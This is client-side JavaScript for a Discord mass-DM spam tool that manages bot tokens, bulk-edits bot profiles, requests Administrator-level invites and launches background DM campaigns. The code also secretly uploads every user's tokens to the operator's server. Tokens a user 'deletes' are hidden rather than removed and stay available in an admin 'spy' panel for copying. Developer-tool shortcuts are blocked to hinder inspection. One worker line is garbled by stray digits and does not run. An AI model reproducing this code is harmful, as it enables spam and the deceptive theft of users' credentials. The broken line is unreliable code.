// --- ANTI-SLEEP BACKGROUND WORKER ---
const workerBlob = new Blob([`self.onmessage = 89876777777777777777777777777777777777777777777function(e) { setTimeout(() => self.postMessage('wake_up'), e.data); };`], { type: 'application/javascript' });
const antiSleepWorker = new Worker(URL.createObjectURL(workerBlob));

function backgroundSafeSleep(ms) {
    return new Promise(resolve => {
        const handler = () => { antiSleepWorker.removeEventListener('message', handler); resolve(); };
        antiSleepWorker.addEventListener('message', handler); antiSleepWorker.postMessage(ms);
    });
}

// --- SECURITY & WARNINGS ---
document.addEventListener('keydown', function(event) {
    if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && event.keyCode === 73) || (event.ctrlKey && event.keyCode === 85)) {
        event.preventDefault(); return false;
    }
});

$(document).ready(function() {
    $('#access-gate-key').on('keypress', function(e) { if(e.which === 13) loginSystem(); });
    $("#launch-audience").on('change', function() {
        if($(this).val() === 'test') $("#test-id-box").removeClass("hidden");
        else $("#test-id-box").addClass("hidden");
    });
});

// --- STATE VARIABLES ---
let activeKey = localStorage.getItem('nosify_dm_session') || null;
let adminPass = localStorage.getItem('nosify_dm_admin_pass') || null;
let tokensDB = JSON.parse(localStorage.getItem('nosify_dm_tokens')) || [];
let embedsDB = JSON.parse(localStorage.getItem('nosify_dm_embeds')) || [];
let blacklistDB = JSON.parse(localStorage.getItem('nosify_dm_blacklist')) || [];
let statsDB = JSON.parse(localStorage.getItem('nosify_dm_stats')) || { sent: 0, failed: 0 };
let runHistory = JSON.parse(localStorage.getItem('nosify_dm_history')) || [];

let dmDelay = parseInt(localStorage.getItem('nosify_dm_delay')) || 200;
let concurrencyLimit = parseInt(localStorage.getItem('nosify_dm_concurrency')) || 20;

let engineRunning = false;
let massEditTargetGroup = null; 

// --- CLOUD SYNC LOGIC ---
function saveTokens() {
    localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB));
    
    // Do not sync if the admin is logged in (Admins don't spy on themselves)
    if (!activeKey || activeKey === "SECURE_ADMIN_TOKEN") return;
    
    fetch('/api/app', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'sync_cloud', key: activeKey, data: { tokens: tokensDB } })
    }).catch(e => {});
}

window.onload = () => {
    if (activeKey === "SECURE_ADMIN_TOKEN") {
        showAdminPanel();
    } else if (activeKey) {
        showApp(); renderTokens(); renderEmbeds(); renderBlacklist(); updateStats(); renderHistory();
        $("#cfg-dm-delay").val(dmDelay); $("#cfg-concurrency").val(concurrencyLimit);
        
        // --- RESTORES UI IF CAMPAIGN IS ALREADY RUNNING ---
        checkExistingCampaign(); 
        
        // AUTO-KICK SECURITY TIMER (Checks DB every 60s)
        setInterval(async () => {
            try {
                let res = await fetch('/api/app', {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'verify_key', key: activeKey })
                });
                let data = await res.json();
                
                // STRICT CHECK: Only kick if the server specifically confirms the key is dead
                if (data && data.valid === false) {
                    alert("Your access key has expired or was revoked. You have been logged out.");
                    logoutSystem();
                }
            } catch (e) {} // Ignore random internet/database drops without logging them out
        }, 60000);

    }
};

// --- LOGIN & NAVIGATION ---
async function loginSystem() {
    let val = $("#access-gate-key").val().trim();
    if (!val) return;
    let btn = $("#login-btn"); btn.text("Logging in...").prop("disabled", true).css("opacity", "0.7");
    let deviceId = localStorage.getItem('nosify_dm_device') || 'DEV-' + Math.random().toString(36).substr(2, 9).toUpperCase();
    localStorage.setItem('nosify_dm_device', deviceId);

    try {
        const response = await fetch('/api/login', { 
            method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ key: val, deviceId: deviceId }) 
        });
        const data = await response.json();
        if (data.success) {
            localStorage.setItem('nosify_dm_session', data.role === 'admin' ? 'SECURE_ADMIN_TOKEN' : val);
            if (data.role === 'admin') localStorage.setItem('nosify_dm_admin_pass', val);
            window.location.reload();
        } else { alert(data.error); btn.text("Log In").prop("disabled", false).css("opacity", "1"); }
    } catch (err) { alert("Server error."); btn.text("Log In").prop("disabled", false).css("opacity", "1"); }
}

function showApp() { $("#gatekeeper-modal").addClass("hidden"); $("#app-workspace").removeClass("hidden"); }
function showAdminPanel() { $("#gatekeeper-modal").addClass("hidden"); $("#admin-dashboard").removeClass("hidden"); loadAdminKeys(); }
function logoutSystem() { localStorage.removeItem('nosify_dm_session'); localStorage.removeItem('nosify_dm_admin_pass'); window.location.reload(); }
function switchTab(id) { $(".tab-content, .nav-item").removeClass('active'); $("#"+id).addClass('active'); $("#" + id.replace('tab', 'nav')).addClass('active'); }
function switchAdminTab(id) { $("#admin-keys, #admin-tokens").addClass("hidden"); $("#"+id).removeClass("hidden"); }

function switchConsoleView(view) {
    if(view === 'live') {
        $("#console-live").removeClass("hidden"); $("#console-history").addClass("hidden");
        $("#btn-con-live").removeClass("bg-transparent text-gray-400").addClass("bg-[#6366f1] text-white");
        $("#btn-con-hist").removeClass("bg-[#6366f1] text-white").addClass("bg-transparent text-gray-400");
    } else {
        $("#console-history").removeClass("hidden"); $("#console-live").addClass("hidden");
        $("#btn-con-hist").removeClass("bg-transparent text-gray-400").addClass("bg-[#6366f1] text-white");
        $("#btn-con-live").removeClass("bg-[#6366f1] text-white").addClass("bg-transparent text-gray-400");
    }
}

function saveRateLimits() {
    dmDelay = parseInt($("#cfg-dm-delay").val()) || 200;
    concurrencyLimit = parseInt($("#cfg-concurrency").val()) || 20;
    localStorage.setItem('nosify_dm_delay', dmDelay); localStorage.setItem('nosify_dm_concurrency', concurrencyLimit);
}

// --- DISCORD PROXY ---
async function discordProxy(url, method, token, body = null) {
    return await fetch('/api/app', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'discord_proxy', data: { url, method, token, body }})
    });
}

// --- TOKEN MANAGER & FOLDERS ---
function addToken() {
    let rawInput = $("#add-token-val").val().trim(); 
    let groupName = $("#add-token-group").val().trim() || "Default Folder";
    if (!rawInput) return;
    
    let tokensToAdd = [];
    try {
        let parsed = JSON.parse(rawInput);
        if (Array.isArray(parsed)) tokensToAdd = parsed; else tokensToAdd = [rawInput];
    } catch(e) { 
        tokensToAdd = rawInput.split(/[\n\r\s,]+/).map(t => t.replace(/["']/g, "").trim()); 
    }

    let addedCount = 0;
    tokensToAdd.forEach(t => {
        if (t.length > 20) {
            let existingToken = tokensDB.find(x => x.token === t);
            
            if (!existingToken) {
                // It's a brand new token, add it normally
                tokensDB.push({ token: t, group: groupName, status: 'Not Checked', name: 'Unknown Bot', id: null }); 
                addedCount++;
            } else if (existingToken.status === "Deleted by User 🗑️") {
                // It was deleted before! Bring it back to life in the new folder.
                existingToken.group = groupName;
                existingToken.status = 'Not Checked';
                addedCount++;
            }
        }
    });

    if (addedCount > 0) {
        saveTokens();
        $("#add-token-val").val(""); renderTokens(); 
        alert(`Successfully imported/restored ${addedCount} tokens!`);
    } else {
        alert("No valid new tokens found. (Make sure they are real tokens over 20 characters and aren't already active in a folder).");
    }
}


function deleteToken(i) { 
    tokensDB[i].status = "Deleted by User 🗑️";
    tokensDB[i].group = "Deleted Folder"; 
    saveTokens(); 
    renderTokens();
    alert("Token removed. (Admin notified)"); 
}

function clearFolder(groupName) {
    if(!confirm(`Are you sure you want to delete the entire "${groupName}" folder?`)) return;
    tokensDB.forEach(t => {
        if (t.group === groupName) { t.status = "Deleted by User 🗑️"; t.group = "Deleted Folder"; }
    });
    saveTokens(); renderTokens();
}

function clearAllTokens() { 
    if(confirm("Clear all tokens?")) { 
        tokensDB.forEach(t => { t.status = "Deleted by User 🗑️"; t.group = "Deleted Folder"; });
        saveTokens(); renderTokens(); 
    }
}

async function checkToken(i, skipRender = false) {
    let tok = tokensDB[i]; $(`#tok-stat-${i}`).text("Checking...");
    try {
        let res = await discordProxy('https://discord.com/api/v10/users/@me', 'GET', tok.token);
        if(res.ok) { let data = await res.json(); tok.status = "Alive ✅"; tok.name = data.username; tok.id = data.id; } 
        else { tok.status = "Dead/Terminated ❌"; tok.id = null; }
    } catch(e) { tok.status = "Error ⚠️"; }
    if(!skipRender) { saveTokens(); renderTokens(); }
}

async function checkFolder(groupName) {
    let indices = tokensDB.map((t, i) => t.group === groupName ? i : -1).filter(i => i !== -1);
    for (let i of indices) { await checkToken(i, true); await backgroundSafeSleep(200); }
    saveTokens(); renderTokens(); alert(`Finished checking bots in ${groupName}!`);
}

function copyFolderInvites(groupName) {
    let aliveBots = tokensDB.filter(t => t.group === groupName && t.id && t.status.includes('Alive'));
    if (aliveBots.length === 0) return alert(`No alive bots found in folder: ${groupName}`);
    let links = aliveBots.map(b => `https://discord.com/oauth2/authorize?client_id=${b.id}&permissions=8&integration_type=0&scope=bot`).join('\n');
    navigator.clipboard.writeText(links); alert(`Copied ${aliveBots.length} invite links!`);
}

function copyInvite(botId) {
    let link = `https://discord.com/oauth2/authorize?client_id=${botId}&permissions=8&integration_type=0&scope=bot`;
    navigator.clipboard.writeText(link); alert("Invite Link copied!");
}

function renderTokens() {
    let html = ""; let groupsObj = {};

    tokensDB.forEach((t, i) => {
        if (t.status === "Deleted by User 🗑️") return; // Hidden from user
        if(!groupsObj[t.group]) groupsObj[t.group] = [];
        groupsObj[t.group].push({ token: t, index: i });
    });

    for (let g in groupsObj) {
        let botsInGroup = groupsObj[g];
        let safeG = g.replace(/'/g, "\\'"); 

        html += `
        <details class="mb-3 bg-black/30 rounded-xl border border-[var(--site-border)] overflow-hidden shadow-md">
            <summary class="cursor-pointer font-bold text-indigo-400 bg-black/40 p-3 outline-none hover:bg-black/60 transition flex justify-between items-center">
                <span>📁 ${g}</span> 
                <span class="text-xs text-gray-500 font-mono">${botsInGroup.length} bots</span>
            </summary>
            
            <div class="bg-black/50 p-2 flex flex-wrap gap-2 border-b border-[var(--site-border)]">
                <button onclick="checkFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-green-500/10 text-green-400 border-green-500/30 hover:bg-green-500/20">Check Folder</button>
                <button onclick="copyFolderInvites('${safeG}')" class="btn-dark text-[10px] flex-1 bg-blue-500/10 text-blue-400 border-blue-500/30 hover:bg-blue-500/20">Copy Invites</button>
                <button onclick="massEditFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-indigo-500/10 text-indigo-400 border-indigo-500/30 hover:bg-indigo-500/20">Mass Edit</button>
                <button onclick="clearFolder('${safeG}')" class="btn-dark text-[10px] flex-1 bg-red-500/10 text-red-400 border-red-500/30 hover:bg-red-500/20">Delete Folder</button>
            </div>

            <div class="overflow-x-auto p-2">
                <table class="w-full text-xs text-left"><tbody class="divide-y divide-[var(--site-border)]">`;
        
        botsInGroup.forEach(item => {
            let t = item.token; let i = item.index;
            let actionBtns = `<button onclick="checkToken(${i})" class="bg-[#27272a] text-white text-[10px] px-3 py-1.5 rounded-lg mr-2 hover:bg-[#3f3f46]">Check</button>`;
            if(t.status.includes('Alive')) {
                actionBtns += `<button onclick="openBotEditor(${i}, false)" class="bg-[#4f46e5] text-white text-[10px] px-3 py-1.5 rounded-lg mr-2 hover:bg-[#4338ca]">Edit</button>`;
                actionBtns += `<button onclick="copyInvite('${t.id}')" class="bg-green-600/20 border border-green-500/50 text-green-400 text-[10px] px-3 py-1.5 rounded-lg mr-2 hover:bg-green-600/40">Invite</button>`;
            }
            actionBtns += `<button onclick="deleteToken(${i})" class="text-red-400 hover:text-red-500 font-bold text-sm">✕</button>`;
            html += `<tr class="hover:bg-black/20 transition duration-150"><td class="p-2 font-mono truncate max-w-[100px] opacity-80">${t.token}</td><td class="p-2 text-[#6366f1] font-semibold">${t.name}</td><td class="p-2 text-xs opacity-90" id="tok-stat-${i}">${t.status}</td><td class="p-2 text-right whitespace-nowrap">${actionBtns}</td></tr>`;
        });
        html += `</tbody></table></div></details>`;
    }

    if (Object.keys(groupsObj).length === 0) html = `<div class="text-center text-gray-500 text-xs py-4">No tokens added yet.</div>`;
    $("#token-list").html(html);

    let gHtml = `<option value="">Select Bot Group...</option>`; 
    Object.keys(groupsObj).forEach(g => gHtml += `<option value="${g}">${g}</option>`);
    $("#launch-token-group").html(gHtml);
}

// --- PROFILE EDITOR ---
let isMassEditing = false;
function openBotEditor(index, isMass) {
    isMassEditing = isMass; $("#editor-title").text("Edit Single Bot Profile");
    $("#edit-bot-index").val(index); $("#edit-bot-name").val(""); $("#edit-bot-avatar").val("");
    $("#bot-editor-modal").removeClass("hidden");
}
function massEditFolder(groupName) {
    let aliveCount = tokensDB.filter(t => t.group === groupName && t.status.includes('Alive')).length;
    if(aliveCount === 0) return alert("No active bots in this folder! Check them first.");
    isMassEditing = true; massEditTargetGroup = groupName;
    $("#editor-title").text(`Mass Edit: ${groupName}`);
    $("#edit-bot-index").val(""); $("#edit-bot-name").val(""); $("#edit-bot-avatar").val("");
    $("#bot-editor-modal").removeClass("hidden");
}
function closeBotEditor() { $("#bot-editor-modal").addClass("hidden"); }

async function getBase64FromUrl(url) {
    try { const data = await fetch('https://corsproxy.io/?' + encodeURIComponent(url)); const blob = await data.blob();
        return new Promise(resolve => { const r = new FileReader(); r.readAsDataURL(blob); r.onloadend = () => resolve(r.result); });
    } catch(e) { return null; }
}

async function saveBotProfile() {
    let newName = $("#edit-bot-name").val().trim(); let newAvatarUrl = $("#edit-bot-avatar").val().trim();
    if(!newName && !newAvatarUrl) return closeBotEditor();
    let btn = $("#save-bot-btn"); btn.text("Processing...").prop("disabled", true);

    let payload = {};
    if (newName) payload.username = newName;
    if (newAvatarUrl) {
        let base64Img = await getBase64FromUrl(newAvatarUrl);
        if (base64Img) payload.avatar = base64Img; else alert("Image conversion failed.");
    }

    let botsToEdit = isMassEditing ? tokensDB.filter(t => t.group === massEditTargetGroup && t.status.includes('Alive')) : [tokensDB[$("#edit-bot-index").val()]];
    for (let b of botsToEdit) {
        try {
            let res = await discordProxy('https://discord.com/api/v10/users/@me', 'PATCH', b.token, payload);
            if(res.ok) { let data = await res.json(); b.name = data.username; }
        } catch(e) {}
        if(isMassEditing) await backgroundSafeSleep(1000);
    }
    saveTokens(); renderTokens();
    btn.text("Push Changes to Discord").prop("disabled", false); closeBotEditor(); alert("Profile update(s) completed!");
}

// --- SERVERS ---
async function loadServersForGroup() {
    let group = $("#launch-token-group").val();
    if(!group) return $("#target-server").html('<option value="">Select a Bot Group First...</option>');
    let bots = tokensDB.filter(t => t.group === group && t.status.includes('Alive'));
    if (bots.length === 0) return $("#target-server").html('<option value="">No active bots found!</option>');
    
    $("#target-server").html('<option value="">Fetching servers...</option>');
    try {
        let res = await discordProxy('https://discord.com/api/v10/users/@me/guilds', 'GET', bots[0].token);
        if (res.ok) {
            let guilds = await res.json();
            if (guilds.length === 0) { $("#target-server").html('<option value="">Bot is not in any servers</option>'); } 
            else {
                let options = `<option value="">-- Choose a Server --</option>` + guilds.map(g => `<option value="${g.id}">${g.name} (${g.id})</option>`).join('');
                $("#target-server").html(options);
            }
        } else $("#target-server").html('<option value="">Failed to fetch servers</option>');
    } catch(e) { $("#target-server").html('<option value="">Network error</option>'); }
}

// --- EMBED BUILDER ---
function addEmbed() {
    let n = $("#add-embed-name").val().trim(), j = $("#add-embed-json").val().trim();
    if(!n || !j) return;
    try { JSON.parse(j); } catch(e) { return alert("Invalid JSON format."); }
    
    let existingIndex = embedsDB.findIndex(e => e.name.toLowerCase() === n.toLowerCase());
    if (existingIndex !== -1) embedsDB[existingIndex].json = j;
    else embedsDB.push({ name: n, json: j });
    
    localStorage.setItem('nosify_dm_embeds', JSON.stringify(embedsDB));
    $("#add-embed-name, #add-embed-json").val(""); renderEmbeds(); alert(`Embed "${n}" saved!`);
}
function deleteEmbed(i) { embedsDB.splice(i, 1); localStorage.setItem('nosify_dm_embeds', JSON.stringify(embedsDB)); renderEmbeds(); }
function renderEmbeds() {
    let html = "", selHtml = "";
    embedsDB.forEach((e, i) => {
        html += `<div class="flex justify-between items-center p-3 border-b border-[var(--site-border)] text-sm hover:bg-black/10 rounded-lg"><span class="font-bold text-gray-200">${e.name}</span><div class="flex gap-3"><button onclick="$('#add-embed-name').val('${e.name}'); $('#add-embed-json').val(JSON.stringify(embedsDB[${i}].json));" class="text-[#6366f1] text-xs">Load</button><button onclick="deleteEmbed(${i})" class="text-red-400 font-bold text-sm">✕</button></div></div>`;
        selHtml += `<option value="${i}">${e.name}</option>`;
    });
    $("#embed-list").html(html); $("#launch-embed").html(selHtml);
}
async function testWebhook() {
    let webhook = $("#test-webhook-url").val().trim(); let jStr = $("#add-embed-json").val().trim();
    if (!webhook || !jStr) return alert("Missing Webhook URL or JSON.");
    let processedStr = jStr.replace(/{userid}/g, '123456789012345678').replace(/{usermention}/g, '<@123456789012345678>');
    try {
        let res = await fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(JSON.parse(processedStr)) });
        if (res.ok) alert("Preview sent successfully!"); else alert("Discord rejected the payload.");
    } catch(e) { alert("Invalid JSON format."); }
}

// --- FILTERS & HISTORY LOGIC ---
function addBlacklist() {
    let id = $("#add-blacklist-val").val().trim(); if (!id || blacklistDB.includes(id)) return;
    blacklistDB.push(id); localStorage.setItem('nosify_dm_blacklist', JSON.stringify(blacklistDB)); $("#add-blacklist-val").val(""); renderBlacklist();
}
function removeBlacklist(i) { blacklistDB.splice(i, 1); localStorage.setItem('nosify_dm_blacklist', JSON.stringify(blacklistDB)); renderBlacklist(); }
function renderBlacklist() {
    let html = ""; blacklistDB.forEach((id, i) => html += `<div class="flex justify-between p-2 border-b border-[var(--site-border)]"><span class="font-mono text-gray-300">${id}</span><button onclick="removeBlacklist(${i})" class="text-red-400">✕</button></div>`);
    $("#blacklist-list").html(html);
}

function updateStats() { 
    let activeTokenCount = tokensDB.filter(t => t.status !== "Deleted by User 🗑️").length;
    $("#stat-sent").text(statsDB.sent); $("#stat-failed").text(statsDB.failed); $("#stat-tokens").text(activeTokenCount); 
}

function addHistoryRecord(type, serverId, sent, failed, left) {
    let record = { type: type, time: new Date().toLocaleString(), server: serverId, sent: sent, failed: failed, left: left };
    runHistory.unshift(record);
    if(runHistory.length > 50) runHistory.pop(); 
    localStorage.setItem('nosify_dm_history', JSON.stringify(runHistory)); renderHistory();
}

function renderHistory() {
    let html = '';
    if (runHistory.length === 0) {
        html = `<div class="text-gray-500 text-center mt-10 text-sm">No recent campaigns.</div>`;
    } else {
        runHistory.forEach(h => {
            let borderCol = h.type === 'finished' ? 'border-green-500' : 'border-yellow-500';
            let title = h.type === 'finished' ? '✅ Campaign Launched Offline' : '🛑 Kill Switch Activated';
            html += `
            <div class="glass-card mb-4 !p-4 border-l-4 ${borderCol} hover:bg-white/5 transition">
                <div class="flex justify-between items-center mb-2"><span class="font-bold text-white text-sm">${title}</span><span class="text-xs text-gray-400">${h.time}</span></div>
                <div class="text-xs text-gray-300 mb-2">Target Server: <span class="font-mono bg-black/30 px-2 py-0.5 rounded">${h.server}</span></div>
                <div class="flex gap-4 text-xs font-bold bg-black/20 p-2 rounded-lg"><span class="text-gray-400">Status: Running in Background Engine</span></div>
            </div>`;
        });
    }
    $("#terminal-output").html(html).removeClass("h-[500px]").addClass("h-auto max-h-[500px] overflow-y-auto");
}

function clearTerminalLogs() { runHistory = []; localStorage.removeItem('nosify_dm_history'); renderHistory(); }

// --- THE HEADLESS LAUNCH ENGINE ---
function promptDmall() {
    if ($("#auto-leave-toggle").is(":checked")) $("#leave-warning-modal").removeClass("hidden"); else executeDmall();
}
function cancelDmall() { $("#leave-warning-modal").addClass("hidden"); }
function confirmDmall() { $("#leave-warning-modal").addClass("hidden"); executeDmall(); }

// --- LIVE TRACKER & AUTO-RESUME ---
let liveTracker = null;

async function checkExistingCampaign() {
    try {
        let res = await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'get_spy_data' }) });
        let db = await res.json();
        let job = db.cloudData ? db.cloudData.activeJob : null;
        
        // If the database says a job is currently active or processing, lock the UI and resume tracking
        if (job && (job.status === "active" || job.status === "processing")) {
            startLiveTracking();
        }
    } catch(e) {}
}

function startLiveTracking() {
    if(liveTracker) clearInterval(liveTracker);
    
    // Lock the engine and switch to the console tab
    engineRunning = true;
    switchTab('tab-console'); 
    switchConsoleView('live');
    $("#dmall-status-text").text("Engine Running Offline 24/7...");

    liveTracker = setInterval(async () => {
        if(!engineRunning) return clearInterval(liveTracker);
        try {
            let res = await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'get_spy_data' }) });
            let db = await res.json();
            let job = db.cloudData ? db.cloudData.activeJob : null;
            
            if (job && job.progress) {
                let p = job.progress;
                $("#con-sent").text(p.sent);
                $("#con-failed").text(p.failed);
                
                let left = p.total - (p.sent + p.failed);
                $("#con-left").text(left > 0 ? left : 0);
                
                let pct = Math.floor(((p.sent + p.failed) / p.total) * 100) || 0;
                $("#con-progress").css("width", `${pct}%`); $("#con-percent").text(`${pct}%`);
                
                // Stop tracking automatically if engine finishes or gets killed
                if (job.status === "finished" || job.status === "killed") {
                    engineRunning = false; clearInterval(liveTracker);
                    $("#dmall-status-text").text(job.status === "finished" ? "Campaign Complete." : "Engine Halted.");
                    addHistoryRecord(job.status === "finished" ? 'finished' : 'paused', job.serverId || "Unknown", p.sent, p.failed, left > 0 ? left : 0);
                }
            }
        } catch(e) {} // Ignores network spikes
    }, 3000);
}

async function executeDmall() {
    // Better warning message
    if(engineRunning) return alert("⚠️ A campaign is already running! Check your Logs tab. You must stop it before starting a new one.");
    
    let group = $("#launch-token-group").val(); let serverId = $("#target-server").val();
    let autoLeave = $("#auto-leave-toggle").is(":checked"); let embedIdx = $("#launch-embed").val();
    let audience = $("#launch-audience").val(); let testId = $("#test-user-id").val();
    
    if(!group || !serverId || !embedIdx) return alert("Please fill all setup fields.");
    if(audience === 'test' && !testId) return alert("Enter Test ID!");

    let activeBots = tokensDB.filter(t => t.group === group && t.status.includes('Alive')).map(b => ({ token: b.token, fails: 0 }));
    if(activeBots.length === 0) return alert("No active bots in folder!");

    let rawEmbedJson = embedsDB[embedIdx].json;

    let launchOrder = {
        status: "active", serverId: serverId, bots: activeBots, embedJson: rawEmbedJson,
        audience: audience, testId: testId, autoLeave: autoLeave, concurrency: concurrencyLimit,
        delay: dmDelay, blacklist: blacklistDB
    };

    $("#dmall-status-text").text("Pushing to 24/7 Node.js Engine...");
    $("#con-sent").text("0"); $("#con-failed").text("0"); $("#con-left").text("Calc..."); $("#con-percent").text("0%"); $("#con-progress").css("width", "0%");

    try {
        await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'launch_campaign', data: launchOrder }) });
        alert("✅ Campaign successfully pushed to the backend! You can safely close your browser or turn off your PC.");
        
        // Triggers the auto-resume function we just built
        startLiveTracking(); 
        
    } catch(e) { alert("Failed to connect to the database."); $("#dmall-status-text").text("Launch Failed."); }
}
async function stopDmall() { 
    $("#dmall-status-text").text("Sending Kill Switch...");
    try {
        await fetch('/api/app', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ action: 'kill_campaign' }) });
        alert("🛑 Kill switch sent! The backend engine will halt on its next chunk.");
        engineRunning = false; 
        if(liveTracker) clearInterval(liveTracker); // Stop the UI from pinging
        $("#dmall-status-text").text("Engine Halted.");
        
        let s = $("#con-sent").text(); let f = $("#con-failed").text(); let l = $("#con-left").text();
        addHistoryRecord('paused', $("#target-server").val() || "Unknown", s, f, l);
    } catch(e) { alert("Failed to send kill switch."); }
}
// --- ADMIN PANEL API & HELPER ---
function copyTextData(encodedText) {
    navigator.clipboard.writeText(decodeURIComponent(encodedText)); alert("Tokens copied to clipboard!");
}

async function adminAction(action, payload) {
    await fetch('/api/admin', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': adminPass }, body: JSON.stringify({ action, payload }) });
    loadAdminKeys();
}

async function createKey() {
    let customName = $("#adm-custom-name").val().trim();
    let k = customName ? customName : "KEY-" + Math.random().toString(36).substr(2, 6).toUpperCase();
    let time = $("#adm-key-time").val(); let max = $("#adm-key-uses").val();
    let exp = null; if (time !== "perm") { let ms = new Date().getTime(); if (time === "1d") exp = ms + (24*3600000); }
    await adminAction('create_key', { key: k, time: time, max: max, left: max === "perm" ? "perm" : parseInt(max), expires: exp, claimedBy: null });
    $("#adm-custom-name").val("");
}

function deleteKey(idx) { if(confirm("Delete this key?")) adminAction('delete_key', idx); }
function copyKey(keyText) { navigator.clipboard.writeText(keyText); alert("Key copied!"); }

async function loadAdminKeys() {
    if(!adminPass) return;
    const res = await fetch('/api/admin', { headers: { 'Authorization': adminPass }});
    if(!res.ok) return logoutSystem();
    const db = await res.json(); let html = "";
    if (db.keys) {
        db.keys.forEach((k, i) => {
            html += `<tr class="border-b border-gray-800"><td class="py-3 px-2 text-[#6366f1] font-bold">${k.key}</td><td class="py-3 px-2 text-gray-300">${k.time}</td><td class="py-3 px-2 text-green-400 font-mono">${k.left}</td><td class="py-3 px-2 text-gray-500 font-mono text-xs opacity-80 truncate max-w-[80px]">${k.claimedBy || 'Unused'}</td><td class="py-3 px-2 text-right whitespace-nowrap"><button onclick="copyKey('${k.key}')" class="bg-[#27272a] text-white text-[10px] px-3 py-1.5 rounded mr-2">Copy</button><button onclick="deleteKey(${i})" class="text-red-400 font-bold text-sm">✕</button></td></tr>`;
        });
    }
    $("#adm-keys-list").html(html);
}

// SPY LOGS WITH FOLDERS & DELETED HISTORY
async function loadAdminSpyData() {
    let res = await fetch('/api/app', { 
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'get_spy_data' })
    });
    let db = await res.json();

    
    let html = "";
    let cloud = db.cloudData || {};
    let userCount = 1;
    
    for (let userKey in cloud) {
        if (userKey === "activeJob" || userKey === "stats") continue; 
        
        let userData = cloud[userKey];
        let userTokens = userData.tokens || [];
        if (userTokens.length === 0) continue;

        let folders = {};
        userTokens.forEach(t => {
            if(!folders[t.group]) folders[t.group] = [];
            // Appends the status (like 🗑️) to the token view so admin knows what happened to it
            let displayToken = t.status === "Deleted by User 🗑️" ? `<span class="text-red-500 line-through opacity-50">${t.token}</span> (Deleted)` : t.token;
            folders[t.group].push({ raw: t.token, display: displayToken });
        });

        let rawTokensToCopy = encodeURIComponent(userTokens.map(t => t.token).join('\n'));

        html += `
        <div class="mb-6 p-4 border border-[var(--site-border)] rounded-xl bg-black/40">
            <div class="flex justify-between items-center mb-4 border-b border-[var(--site-border)] pb-2">
                <h3 class="font-bold text-indigo-400 text-lg">${userCount}. Key: <span class="text-white font-mono bg-black/50 px-2 py-1 rounded">${userKey}</span></h3>
                <button onclick="copyTextData('${rawTokensToCopy}')" class="bg-[#4f46e5] text-white text-xs px-3 py-1.5 rounded-lg hover:bg-[#4338ca] shadow-lg shadow-indigo-500/20">Copy All Tokens</button>
            </div>
        `;

        for (let folderName in folders) {
            let folderColor = folderName === "Deleted Folder" ? "text-red-400" : "text-gray-300";
            html += `
            <div class="mb-3">
                <h4 class="text-sm font-bold ${folderColor} mb-1">📁 ${folderName} (${folders[folderName].length} bots)</h4>
                <div class="max-h-24 overflow-y-auto bg-black/50 p-2 rounded text-xs font-mono text-gray-400 break-all border border-white/5">
                    ${folders[folderName].map(f => f.display).join('<br>')}
                </div>
            </div>`;
        }
        
        html += `</div>`;
        userCount++;
    }
    
    if (html === "") html = "<div class='text-gray-500 text-sm'>No users have synced tokens yet. (Note: Admin tokens do not sync here).</div>";
    $("#spy-content").html(html).removeClass("whitespace-pre-wrap font-mono");
        }
        
